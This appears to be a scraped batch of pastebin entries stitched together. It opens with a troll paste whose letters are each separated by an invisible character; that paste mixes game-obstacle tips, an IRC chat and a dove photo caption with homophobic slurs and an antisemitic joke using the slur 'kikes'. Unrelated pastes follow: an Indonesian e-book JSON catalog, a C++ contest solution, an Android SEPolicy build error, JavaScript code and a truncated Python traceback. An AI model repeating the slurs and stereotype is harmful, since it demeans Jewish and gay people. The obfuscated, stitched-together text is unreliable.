W‎h‎o‎ ‎w‎o‎u‎l‎d‎ ‎b‎u‎r‎y‎ ‎a‎ ‎p‎e‎r‎s‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎i‎r‎ ‎f‎r‎o‎n‎t‎ ‎y‎a‎r‎d‎?‎ ‎ ‎D‎o‎n‎'‎t‎ ‎y‎o‎u‎ ‎n‎e‎e‎d‎ ‎a‎ ‎s‎p‎e‎c‎i‎a‎l‎ ‎p‎e‎r‎m‎i‎t‎ ‎
f‎o‎r‎ ‎t‎h‎a‎t‎?‎ ‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎t‎o‎m‎b‎s‎t‎o‎n‎e‎s‎ ‎a‎r‎e‎ ‎f‎o‎u‎n‎d‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎m‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎r‎e‎d‎ ‎h‎o‎u‎s‎e‎s‎.‎ ‎ ‎
Y‎o‎u‎ ‎c‎a‎n‎ ‎p‎i‎c‎k‎ ‎u‎p‎ ‎3‎0‎0‎ ‎p‎o‎i‎n‎t‎s‎ ‎f‎o‎r‎ ‎k‎n‎o‎c‎k‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎o‎v‎e‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎a‎p‎e‎r‎.‎

L‎a‎r‎g‎e‎ ‎T‎r‎e‎e‎s‎
T‎h‎e‎ ‎l‎a‎r‎g‎e‎r‎,‎ ‎r‎e‎a‎l‎ ‎t‎r‎e‎e‎s‎ ‎c‎a‎n‎ ‎b‎e‎ ‎f‎o‎u‎n‎d‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎a‎r‎ ‎l‎e‎f‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎c‎r‎e‎e‎n‎,‎ ‎
w‎h‎e‎r‎e‎ ‎n‎o‎ ‎o‎n‎e‎ ‎e‎v‎e‎r‎ ‎g‎o‎e‎s‎.‎ ‎ ‎W‎i‎t‎h‎ ‎t‎h‎a‎t‎ ‎i‎n‎ ‎m‎i‎n‎d‎,‎ ‎w‎e‎ ‎c‎a‎n‎ ‎s‎a‎f‎e‎l‎y‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎
e‎a‎s‎y‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎.‎ ‎ ‎O‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎s‎o‎m‎e‎ ‎a‎l‎s‎o‎ ‎a‎p‎p‎e‎a‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎r‎e‎d‎ ‎h‎o‎u‎s‎e‎s‎,‎ ‎a‎s‎ ‎a‎n‎ ‎
a‎l‎t‎e‎r‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎t‎o‎m‎b‎s‎t‎o‎n‎e‎s‎.‎

F‎o‎r‎ ‎S‎a‎l‎e‎ ‎S‎i‎g‎n‎s‎
I‎s‎ ‎e‎v‎e‎r‎y‎ ‎h‎o‎u‎s‎e‎ ‎o‎n‎ ‎t‎h‎i‎s‎ ‎s‎t‎r‎e‎e‎t‎ ‎f‎o‎r‎ ‎s‎a‎l‎e‎?‎ ‎ ‎P‎r‎o‎b‎a‎b‎l‎y‎ ‎n‎o‎t‎,‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎ ‎j‎u‎s‎t‎ ‎n‎e‎e‎d‎e‎d‎ ‎
a‎n‎o‎t‎h‎e‎r‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎!‎ ‎ ‎T‎h‎e‎s‎e‎ ‎s‎i‎g‎n‎s‎ ‎t‎e‎n‎d‎ ‎t‎o‎ ‎g‎e‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎a‎y‎,‎ ‎s‎o‎ ‎w‎a‎t‎c‎h‎ ‎o‎u‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎m‎!‎

L‎a‎w‎n‎m‎o‎w‎e‎r‎s‎
R‎e‎m‎e‎m‎b‎e‎r‎ ‎t‎h‎o‎s‎e‎ ‎h‎a‎n‎d‎ ‎p‎o‎w‎e‎r‎e‎d‎ ‎l‎a‎w‎n‎m‎o‎w‎e‎r‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎a‎l‎w‎a‎y‎s‎ ‎h‎a‎d‎ ‎t‎o‎ ‎u‎s‎e‎ ‎o‎n‎ ‎T‎V‎ ‎i‎n‎ ‎
t‎h‎e‎ ‎8‎0‎s‎?‎ ‎ ‎W‎e‎l‎l‎,‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎i‎n‎ ‎t‎h‎i‎s‎ ‎g‎a‎m‎e‎!‎ ‎ ‎W‎h‎e‎n‎ ‎t‎h‎e‎ ‎l‎a‎w‎n‎m‎o‎w‎e‎r‎s‎ ‎a‎p‎p‎e‎a‎r‎,‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎
a‎l‎w‎a‎y‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎a‎r‎ ‎l‎e‎f‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎c‎r‎e‎e‎n‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎e‎a‎s‎y‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎.‎

D‎o‎g‎h‎o‎u‎s‎e‎s‎
H‎a‎l‎f‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎,‎ ‎i‎t‎'‎s‎ ‎t‎h‎e‎ ‎d‎o‎g‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎d‎a‎n‎g‎e‎r‎,‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎d‎o‎g‎h‎o‎u‎s‎e‎s‎!‎ ‎ ‎B‎u‎t‎,‎ ‎t‎h‎e‎ ‎
d‎o‎g‎h‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎a‎n‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎ ‎b‎l‎o‎c‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎l‎a‎w‎n‎.‎ ‎ ‎B‎e‎ ‎c‎a‎r‎e‎f‎u‎l‎.‎

B‎u‎s‎h‎e‎s‎
T‎h‎e‎ ‎s‎m‎a‎l‎l‎ ‎l‎i‎n‎e‎s‎ ‎o‎f‎ ‎b‎u‎s‎h‎e‎s‎ ‎a‎p‎p‎e‎a‎r‎ ‎o‎n‎ ‎l‎a‎w‎n‎s‎.‎ ‎ ‎D‎r‎i‎v‎e‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎m‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎w‎a‎y‎ ‎y‎o‎u‎ ‎
d‎i‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎M‎i‎n‎i‎a‎t‎u‎r‎e‎ ‎F‎e‎n‎c‎e‎s‎.‎

F‎i‎r‎e‎ ‎H‎y‎d‎r‎a‎n‎t‎s‎
T‎h‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎f‎i‎r‎e‎ ‎h‎y‎d‎r‎a‎n‎t‎s‎ ‎a‎r‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎e‎x‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎c‎u‎r‎b‎.‎ ‎ ‎T‎h‎e‎y‎'‎r‎e‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎
e‎a‎s‎y‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎B‎u‎t‎ ‎w‎a‎i‎t‎,‎ ‎t‎h‎e‎r‎e‎'‎s‎ ‎m‎o‎r‎e‎!‎ ‎I‎f‎ ‎y‎o‎u‎ ‎t‎h‎i‎n‎k‎ ‎t‎h‎o‎s‎e‎ ‎f‎a‎g‎s‎ ‎o‎n‎ ‎#‎L‎R‎H‎ ‎a‎r‎e‎ ‎t‎o‎o‎ ‎g‎a‎y‎,‎ ‎t‎h‎e‎n‎ ‎h‎e‎r‎e‎'‎s‎ ‎#‎I‎R‎C‎3‎0‎""‎:‎

[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎c‎n‎r‎>‎ ‎[‎ ‎K‎R‎K‎ ‎1‎2‎s‎H‎O‎ ‎A‎c‎t‎i‎v‎e‎ ‎S‎t‎u‎d‎i‎o‎ ‎S‎u‎b‎w‎o‎o‎f‎e‎r‎ ‎(‎4‎0‎0‎ ‎W‎a‎t‎t‎s‎)‎ ‎|‎ ‎z‎Z‎o‎u‎n‎d‎s‎ ‎]‎ ‎-‎ ‎w‎w‎w‎.‎z‎z‎o‎u‎n‎d‎s‎.‎c‎o‎m‎
[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎D‎a‎r‎n‎>‎ ‎o‎h‎ ‎n‎i‎c‎e‎
[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎D‎a‎r‎n‎>‎ ‎i‎r‎o‎n‎ ‎b‎l‎o‎c‎k‎ ‎6‎.‎0‎?‎
[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎p‎b‎>‎ ‎t‎h‎a‎t‎'‎l‎l‎ ‎r‎o‎c‎k‎ ‎y‎o‎u‎r‎ ‎n‎u‎t‎s‎ ‎o‎f‎f‎ ‎y‎o‎u‎r‎ ‎s‎c‎r‎o‎t‎u‎m‎
[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎D‎a‎r‎n‎>‎ ‎o‎r‎ ‎w‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎a‎l‎l‎ ‎i‎r‎o‎n‎ ‎b‎l‎o‎c‎k‎,‎ ‎a‎n‎d‎ ‎6‎.‎2‎ ‎a‎l‎u‎m‎i‎n‎u‎m‎
[‎1‎1‎:‎5‎7‎]‎ ‎<‎+‎p‎b‎>‎ ‎K‎R‎K‎ ‎i‎s‎ ‎b‎e‎s‎t‎ ‎f‎o‎r‎ ‎s‎t‎u‎d‎i‎o‎s‎ ‎g‎o‎o‎d‎ ‎b‎u‎m‎p‎
[‎1‎1‎:‎5‎8‎]‎ ‎<‎+‎S‎p‎i‎k‎e‎>‎ ‎N‎a‎h‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎b‎o‎t‎h‎.‎
[‎1‎1‎:‎5‎8‎]‎ ‎<‎+‎D‎a‎r‎n‎>‎ ‎w‎h‎y‎ ‎o‎n‎l‎y‎ ‎4‎0‎0‎w‎?‎
[‎1‎1‎:‎5‎8‎]‎ ‎<‎+‎S‎p‎i‎k‎e‎>‎ ‎T‎h‎i‎s‎ ‎o‎n‎e‎ ‎i‎s‎ ‎a‎l‎u‎m‎i‎n‎u‎m‎ ‎i‎t‎ ‎w‎a‎s‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎e‎s‎c‎a‎l‎a‎d‎e‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎i‎o‎r‎ ‎i‎s‎ ‎f‎r‎o‎m‎.‎
[‎1‎1‎:‎5‎8‎]‎ ‎<‎+‎S‎p‎i‎k‎e‎>‎ ‎I‎ ‎h‎a‎v‎e‎ ‎3‎.‎5‎k‎w‎ ‎o‎f‎ ‎b‎a‎s‎s‎ ‎i‎n‎ ‎m‎y‎ ‎d‎i‎e‎s‎e‎l‎.‎
[‎1‎1‎:‎5‎8‎]‎ ‎<‎+‎S‎p‎i‎k‎e‎>‎ ‎I‎ ‎o‎n‎l‎y‎ ‎h‎a‎v‎e‎ ‎a‎ ‎6‎0‎0‎w‎ ‎i‎n‎ ‎m‎y‎ ‎h‎o‎u‎s‎e‎ ‎a‎n‎d‎ ‎I‎ ‎c‎a‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎t‎u‎r‎n‎ ‎t‎h‎a‎t‎ ‎o‎n‎ ‎c‎a‎u‎s‎e‎ ‎i‎t‎'‎s‎ ‎t‎o‎o‎ ‎l‎o‎u‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎n‎e‎i‎g‎h‎b‎o‎r‎s‎ ‎l‎m‎a‎o‎
[‎1‎1‎:‎5‎9‎]‎ ‎<‎+‎D‎a‎r‎n‎>‎ ‎p‎b‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎i‎s‎ ‎a‎ ‎b‎o‎s‎e‎ ‎g‎u‎y‎
[‎1‎1‎:‎5‎9‎]‎ ‎<‎+‎p‎b‎>‎ ‎n‎a‎a‎h‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
	‎
T‎h‎e‎ ‎s‎p‎o‎t‎t‎e‎d‎ ‎d‎o‎v‎e‎ ‎(‎S‎p‎i‎l‎o‎p‎e‎l‎i‎a‎ ‎c‎h‎i‎n‎e‎n‎s‎i‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎a‎n‎d‎ ‎s‎o‎m‎e‎w‎h‎a‎t‎ ‎l‎o‎n‎g‎-‎t‎a‎i‎l‎e‎d‎ ‎b‎i‎r‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎i‎g‎e‎o‎n‎ ‎f‎a‎m‎i‎l‎y‎,‎ ‎C‎o‎l‎u‎m‎b‎i‎d‎a‎e‎,‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎a‎ ‎c‎o‎m‎m‎o‎n‎ ‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎b‎r‎e‎e‎d‎i‎n‎g‎ ‎b‎i‎r‎d‎ ‎a‎c‎r‎o‎s‎s‎ ‎i‎t‎s‎ ‎n‎a‎t‎i‎v‎e‎ ‎r‎a‎n‎g‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎n‎d‎i‎a‎n‎ ‎s‎u‎b‎c‎o‎n‎t‎i‎n‎e‎n‎t‎ ‎a‎n‎d‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎e‎a‎s‎t‎ ‎A‎s‎i‎a‎.‎ ‎T‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎i‎n‎t‎r‎o‎d‎u‎c‎e‎d‎ ‎t‎o‎ ‎m‎a‎n‎y‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎a‎n‎d‎ ‎f‎e‎r‎a‎l‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎s‎ ‎h‎a‎v‎e‎ ‎b‎e‎c‎o‎m‎e‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎.‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎a‎b‎l‎e‎ ‎p‎l‎u‎m‎a‎g‎e‎ ‎v‎a‎r‎i‎a‎t‎i‎o‎n‎s‎ ‎a‎c‎r‎o‎s‎s‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎s‎ ‎w‎i‎t‎h‎i‎n‎ ‎i‎t‎s‎ ‎w‎i‎d‎e‎ ‎r‎a‎n‎g‎e‎;‎ ‎f‎o‎r‎ ‎e‎x‎a‎m‎p‎l‎e‎ ‎t‎h‎e‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎I‎n‎d‎i‎a‎ ‎a‎n‎d‎ ‎S‎r‎i‎ ‎L‎a‎n‎k‎a‎ ‎a‎r‎e‎ ‎l‎o‎n‎g‎ ‎t‎a‎i‎l‎e‎d‎ ‎a‎n‎d‎ ‎b‎u‎f‎f‎ ‎b‎r‎o‎w‎n‎ ‎i‎n‎ ‎c‎o‎l‎o‎u‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎w‎h‎i‎t‎e‎-‎s‎p‎o‎t‎t‎e‎d‎ ‎b‎l‎a‎c‎k‎ ‎c‎o‎l‎l‎a‎r‎ ‎p‎a‎t‎c‎h‎ ‎o‎n‎ ‎t‎h‎e‎ ‎b‎a‎c‎k‎ ‎a‎n‎d‎ ‎s‎i‎d‎e‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎n‎e‎c‎k‎.‎ ‎T‎h‎i‎s‎ ‎s‎p‎o‎t‎t‎e‎d‎ ‎d‎o‎v‎e‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎K‎a‎n‎h‎a‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎P‎a‎r‎k‎,‎ ‎M‎a‎d‎h‎y‎a‎ ‎P‎r‎a‎d‎e‎s‎h‎,‎ ‎I‎n‎d‎i‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

I‎ ‎t‎h‎i‎n‎k‎ ‎J‎e‎w‎s‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎ ‎w‎i‎t‎h‎ ‎b‎a‎g‎e‎l‎s‎.‎ ‎I‎ ‎m‎e‎a‎n‎,‎ ‎c‎o‎m‎e‎ ‎o‎n‎,‎ ‎k‎i‎k‎e‎s‎.‎ ‎W‎a‎t‎c‎h‎a‎ ‎d‎o‎i‎n‎'‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎i‎n‎ ‎t‎h‎o‎s‎e‎ ‎k‎i‎k‎e‎-‎s‎h‎o‎p‎s‎?‎ ‎O‎y‎ ‎v‎e‎y‎!‎"
bGembmjX,Untitled,BayangBec,JSON,Thursday 22nd of February 2024 07:55:11 PM CDT,"{
  ""meta"": {
    ""limit"": 10,
    ""offset"": 0,
    ""page"": 1,
    ""total"": 5,
    ""total_page"": 1,
    ""sort"": [
      {
        ""column"": ""c.id"",
        ""order"": ""desc""
      }
    ]
  },
  ""data"": [
    {
      ""id"": ""ce7fe4be-ace2-48eb-af6a-f015051a8203"",
      ""catalog_title"": ""Catatan Hati Anindya"",
      ""catalog_cover"": ""https://static.ijakarta.id/publication/book/cover/f87694e95dc0cc4b42fcfe0ac3c7ab36.png"",
      ""catalog_authors"": ""Yuni Wahyono"",
      ""catalog_pages"": 0,
      ""catalog_copies"": 2,
      ""catalog_edition"": null,
      ""catalog_publish_year"": ""2014"",
      ""catalog_eisbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_isbn"": ""978-602-1335-97-0 "",
      ""catalog_file_size_info"": ""982.0 kB"",
      ""catalog_file"": ""ebook/pdf/ce7fe4be-ace2-48eb-af6a-f015051a8203.moco"",
      ""catalog_description"": ""Belum ada sinopsis"",
      ""catalog_publisher"": ""Aksaramaya"",
      ""catalog_imprint"": ""Aksaramaya"",
      ""catalog_categories"": ""Fiksi""
    },
    {
      ""id"": ""cafe5cdc-f770-4c46-b141-f1db03cf9594"",
      ""catalog_title"": ""Perempuan yang Pintar"",
      ""catalog_cover"": ""https://static.ijakarta.id/publication/book/cover/2d42d0dd5a4203ab853dad2f4689b532.png"",
      ""catalog_authors"": ""Astri Damayanti"",
      ""catalog_pages"": 0,
      ""catalog_copies"": 2,
      ""catalog_edition"": null,
      ""catalog_publish_year"": ""2014"",
      ""catalog_eisbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_isbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_file_size_info"": ""3.4 MB"",
      ""catalog_file"": ""ebook/pdf/cafe5cdc-f770-4c46-b141-f1db03cf9594.moco"",
      ""catalog_description"": ""<p style=\""\""><span style=\""\"">Seorang Ayah meragukan\nkecerdasan menantu perempuannya. Ia mengajak menantunya itu berjalan-jalan\nkeliling desa, sekalian hendak meng</span><span style=\""\"">uji</span><span style=\""\""> istri pilihan putranya. Perempuan itu hanya\nmengikuti sambil melontarkan jawaban-jawaban konyol kepada ayah mertuanya.</span><span style=\""\""> Ujian apa yang diberikan sang ayah mertua\nkepada menantu perempuannya itu? Berhasilkan menantu perempuannya itu\nmelewatinya?</span></p>\n\n<p><span> </span></p>"",
      ""catalog_publisher"": ""Aksaramaya"",
      ""catalog_imprint"": ""Aksaramaya"",
      ""catalog_categories"": ""Fiksi""
    },
    {
      ""id"": ""ae13bb1c-3ec3-4257-b816-1f77978fb584"",
      ""catalog_title"": ""Impian Esok pagi : kumpulan puisi "",
      ""catalog_cover"": ""https://static.ijakarta.id/publication/book/cover/ce18a2cb0aa4b6862519bbd5bb9a31bd.png"",
      ""catalog_authors"": ""Maeva"",
      ""catalog_pages"": 0,
      ""catalog_copies"": 2,
      ""catalog_edition"": null,
      ""catalog_publish_year"": ""2016"",
      ""catalog_eisbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_isbn"": ""978-602-14721-8-7"",
      ""catalog_file_size_info"": ""182.1 kB"",
      ""catalog_file"": ""ebook/pdf/ae13bb1c-3ec3-4257-b816-1f77978fb584.moco"",
      ""catalog_description"": """",
      ""catalog_publisher"": ""Aksaramaya"",
      ""catalog_imprint"": ""Aksaramaya"",
      ""catalog_categories"": ""Puisi""
    },
    {
      ""id"": ""9cabae3b-c2cf-4317-8f02-7cf483fb718d"",
      ""catalog_title"": ""Karena Warisan"",
      ""catalog_cover"": ""https://static.ijakarta.id/publication/book/cover/29df2c965fa771f415b674439cbd9d88.png"",
      ""catalog_authors"": ""Astri Damayanti"",
      ""catalog_pages"": 0,
      ""catalog_copies"": 2,
      ""catalog_edition"": null,
      ""catalog_publish_year"": ""2014"",
      ""catalog_eisbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_isbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_file_size_info"": ""312.1 kB"",
      ""catalog_file"": ""ebook/pdf/9cabae3b-c2cf-4317-8f02-7cf483fb718d.moco"",
      ""catalog_description"": ""<p></p><p></p><p></p><p></p><p></p><p></p><p style=\""\""><span style=\""\"">Seorang Ayah yang sedang sakit keras ingin memberikan warisan untuk keempat\nanak laki-lakinya, yaitu empat buah karung berisi emas dan permata. Sudah tentu\nanak-anaknya sangat<span style=\""\"">  </span>antusias. Tanpa\nmereka duga, Ayah mereka telah memberikan sebuah pelajaran untuk keempat\nanaknya itu. Pelajaran berharga seperti seperti apa yang membuat keempat anak\nlaki-lakinya itu menjadi sadar dan berubah? Apakah sakit keras sang ayah akan\nsembuh?</span></p><p></p><p></p><p></p><p></p><p></p><p></p>"",
      ""catalog_publisher"": ""Aksaramaya"",
      ""catalog_imprint"": ""Aksaramaya"",
      ""catalog_categories"": ""Sastra Koleksi""
    },
    {
      ""id"": ""59c1ce4c-ce89-4054-b676-17284ce444dd"",
      ""catalog_title"": ""Antologi Puisi: Sajak Jalanan"",
      ""catalog_cover"": ""https://static.ijakarta.id/publication/book/cover/80fb956736063840abf4cc3520ff8ef6.png"",
      ""catalog_authors"": ""Yodivalno Ikhlas"",
      ""catalog_pages"": 0,
      ""catalog_copies"": 2,
      ""catalog_edition"": null,
      ""catalog_publish_year"": ""2016"",
      ""catalog_eisbn"": ""XXX-XXX-XX-XXXX-X"",
      ""catalog_isbn"": ""978-602-1335-68-0"",
      ""catalog_file_size_info"": ""383.1 kB"",
      ""catalog_file"": ""ebook/pdf/59c1ce4c-ce89-4054-b676-17284ce444dd.moco"",
      ""catalog_description"": """",
      ""catalog_publisher"": ""Aksaramaya"",
      ""catalog_imprint"": ""Aksaramaya"",
      ""catalog_categories"": ""Puisi""
    }
  ]
}"
VeUzpPfr,The Cave polonês,ThegeekKnight16,C++,Thursday 22nd of February 2024 07:03:06 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int MAXN = 5e4 + 10;
array<vector<int>, MAXN> grafo;
array<int, MAXN> cnt;

void dfs(int v, int p)
{
    for (auto viz : grafo[v])
    {
        if (viz == p) continue;
        dfs(viz, v);
    }

    int extra = 1;
    for (int k = 17; k >= 0; k--)
    {
        int marc = 0;
        for (auto viz : grafo[v])
        {
            if (viz == p) continue;
            marc += (((cnt[viz]) >> k)&1);
        }
        if (marc <= 1) continue;
        extra = 0;
        cnt[v] = (1 << (k+1));
        for (auto viz : grafo[v])
        {
            if (viz == p) continue;
            cnt[v] += cnt[viz] - (cnt[viz] % (1 << (k+1)));
        }
        break;
    }
    if (extra == 1) for (auto viz : grafo[v]) if (viz != p) cnt[v] += cnt[viz];

    cnt[v] += extra;
    // cerr << ""v: "" << v << "", cnt: "" << bitset<4>(cnt[v]) << '\n';
}

int main()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    int N;
    cin >> N;
    for (int i = 1; i < N; i++)
    {
        int X, Y;
        cin >> X >> Y;
        grafo[X].push_back(Y);
        grafo[Y].push_back(X);
    }

    dfs(1, 1);

    cout << 31 - __builtin_clz(cnt[1]) << '\n';
}
"
2x0kHc6V,SEPolicy error,Juleast15,Bash,Thursday 22nd of February 2024 06:58:40 PM CDT,"FAILED: build /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows
Outputs: /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows
Error: exited with code: 1
Command: /bin/bash -c ""(ASAN_OPTIONS=detect_leaks=0 /mnt/main/corvus/out/host/linux-x86/bin/checkpolicy -M -c           30 -o /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows.tmp /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/policy.conf ) && (/mnt/main/corvus/out/host/linux-x86/bin/sepolicy-analyze /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows.tmp neverallow -w -f /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/policy_2.conf ||      ( echo \""\"" 1>&2;           echo \""sepolicy-analyze failed. This is most likely due to the use\"" 1>&2;      echo \""of an expanded attribute in a neverallow assertion. Please fix\"" 1>&2;             echo \""the policy.\"" 1>&2;      exit 1 ) ) && (touch /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows.tmp ) && (mv /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows.tmp /mnt/main/corvus/out/target/product/judyp/obj/FAKE/sepolicy_neverallows_intermediates/sepolicy_neverallows )""
Output:
device/lge/sdm845-common/sepolicy/vendor/genfs_contexts:31:ERROR 'syntax error' at token 'proc' on line 68676:
genfscon sysfs /power/system_sleep/stats                                       u:object_r:sysfs_system_sleep_stats:s0genfscon proc /sys/kernel/deny_new_usb u:object_r:proc_deny_new_usb:s0
genfscon sysfs /power/rpmh_stats/master_stats                                  u:object_r:sysfs_rpm:s0
checkpolicy:  error(s) encountered while parsing configuration"
hehXZzsB,Untitled,JMOREY1030,JavaScript,Thursday 22nd of February 2024 06:47:03 PM CDT,"const MyObject = {
    CurrencyDefaultDataActive: async function () {
        let urlFragment = window.location.href.split(""#"")[1];
        let urlParams = urlFragment ? urlFragment.split('&')[1] : '';
        let encodedIds = urlParams ? urlParams.split('=')[1] : '';

        // Decodifica y divide los IDs de las compañías por '%'
        let decodedIds = decodeURIComponent(encodedIds);
        let idsArray = decodedIds.split('%');

        // Filtra y convierte los IDs a números, ignorando los que no son números
        let companyIds = idsArray.filter(id => !Number.isNaN(Number(id))).map(Number);

        // Usa 'return' para devolver el resultado de la llamada asincrónica
        return this._rpc({
            route: '/get/company/' + parseInt(companyIds),
            type: 'json',
            method: 'get',
        });
    },

    report_filter_display: async function () {
        const rateDate = $('.rate-date');
        const multiCurrency = $('.multicurrency');

        // Llamada a la función CurrencyDefaultDataActive
        const currencyValue = await this.CurrencyDefaultDataActive();

        // Mostrar el resultado en la consola
        console.log(""currency_value"", currencyValue);

        $(async function () {
            // Resto del código...
        });
    },
};

// Crear una instancia de MyObject y llamar a report_filter_display
const myInstance = Object.create(MyObject);
myInstance.report_filter_display();"
vWJaNnuk,ResponseException: received 503 HTTP response,Vault-TecTradingCo,Python,Thursday 22nd of February 2024 06:27:56 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/main.py"", line 57, in wrapper
    job_func(*args, **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/main.py"", line 91, in comment_listener
    database_manager.load_comment(comment, db_conn)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/database_manager.py"", line 162, in load_comment
    if not is_mod(comment.author):
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/database_manager.py"", line 25, in is_mod
    moderators_list = get_subreddit_instance(""Fallout76Marketplace"").moderator()
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/models/reddit/subreddit.py"", line 3841, in __call__
    return self.subreddit._reddit.get(url, params=params)
